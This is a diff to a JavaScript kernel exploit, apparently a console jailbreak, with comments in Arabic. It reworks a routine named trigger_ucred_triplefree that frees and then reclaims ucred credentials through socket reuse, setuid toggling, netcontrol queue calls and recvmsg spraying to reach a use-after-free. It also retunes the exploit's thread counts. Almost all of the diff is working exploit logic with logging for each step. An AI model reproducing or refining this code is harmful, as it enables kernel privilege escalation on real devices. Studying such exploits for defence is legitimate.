@@ -115,8 +115,8 @@ var MSG_IOV_NUM = 0x17; // 23
 
 // Params for kext stability
 var IPV6_SOCK_NUM = 64;
-var IOV_THREAD_NUM = 4;
-var UIO_THREAD_NUM = 4;
+var IOV_THREAD_NUM = 16;
+var UIO_THREAD_NUM = 8;
 var MAIN_LOOP_ITERATIONS = 5;
 var TRIPLEFREE_ITERATIONS = 5;
 var MAX_ROUNDS_TWIN = 10;
@@ -1397,18 +1397,18 @@ var TRIPLEFREE_REFCOUNT_MAX_WAIT = 1000;
 function trigger_ucred_triplefree() {
   //log("[TRIGGER] enter trigger_ucred_triplefree");
   var end = false;
-
+  var uaf_socket = -1
   // msgIov كما في الأصلي
   log("[TRIGGER] init msgIov");
-  write64(msgIov.add(0x4), 1);
-  write64(msgIov.add(0x16), 1);
+  write64(msgIov.add(0x0), 1);
+  write64(msgIov.add(0x8), 1);
   var main_count = 0;
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
     //log("[TRIGGER] loop start main_count=" + main_count);
 
     // 1) dummy socket → register in netcontrol
-    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 1);
+    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
     send_notification("step 1: dummy_socket = " + dummy_socket);
 
     // نحتفظ بالـ FD الأصلي قبل أي لعب
@@ -1417,9 +1417,8 @@ function trigger_ucred_triplefree() {
     var sock_buf = malloc(8);
     write32(sock_buf, dummy_socket);
     send_notification("step 1: sock_buf[0..3] = " + read32(sock_buf));
-
     netcontrol(-1, 0x20000003, sock_buf, 8);
-
+    send_notification("step 1: after netcontrol SET_QUEUE");
     // نقفل الـ dummy → نرشّح الـ file + ucred لـ UAF
     close(dummy_socket);
 
@@ -1427,41 +1426,42 @@ function trigger_ucred_triplefree() {
     setuid(1);
 
     // 3) reclaim fd → uaf_socket
-    send_notification("step 3: start (reclaim fd → uaf_socket)");
-    uaf_socket = socket(AF_UNIX, SOCK_STREAM, 1);
+    uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
     send_notification("step 3: uaf_socket = " + uaf_socket + " (expected FD reuse ~ " + dummy_fd + ")");
 
     // 4) free previous ucred
-    setuid(0);
-    send_notification("step 4: (setuid(1) free previous ucred) done");
+    setuid(1);
 
     // هنا التغيير المهم: نستخدم dummy_fd مش uaf_socket
     var ctrl_buf = malloc(8);
-    write32(ctrl_buf, dummy_fd);
-    send_notification("step 5: ctrl_buf[0..3] (dummy_fd) = " + read32(ctrl_buf));
+    write32(ctrl_buf, uaf_socket);
+    send_notification("step 5: ctrl_buf[0..3] (uaf_socket) = " + read32(ctrl_buf));
 
     netcontrol(-1, 0x20000007, ctrl_buf, 8);
-    send_notification("step 5: (after netcontrol CLEAR_QUEUE with dummy_fd) done");
 
     // 6) محاولة إصلاح refcount بشكل خفيف (نخليها زي ما هي مؤقتًا)
+    var tmp_byte = malloc(8)
     send_notification("iov0=" + iov_sock_0 + ", iov1=" + iov_sock_1);
     for (var i = 0; i < 2; i++) {
         trigger_iov_recvmsg();
         var w = write(new BigInt(iov_sock_1), tmp, 1);
         wait_iov_recvmsg();
-        var r = read(new BigInt(iov_sock_0), tmp, 1);
+        var r = read(new BigInt(iov_sock_0), tmp_byte, 1);
 
         send_notification("step 6: loop " + i + " (w=" + w + ", r=" + r + ")");
     }
+
     // 7) double free أول مرة – نحاول نخليها أوضح شوية في اللوج
     var dup_fd = dup(uaf_socket);
     send_notification("step 7: dup_fd = " + dup_fd + " (from uaf_socket = " + uaf_socket + ")");
 
     if (dup_fd > -1) {
       close(dup_fd);
+      send_notification("step 7: close(dup_fd) done");
     } else {
       send_notification("step 7: dup failed");
     }
+
     // 8) إيجاد التوأم
     send_notification("[TRIGGER] step 8: find_twins()");
     end = find_twins();
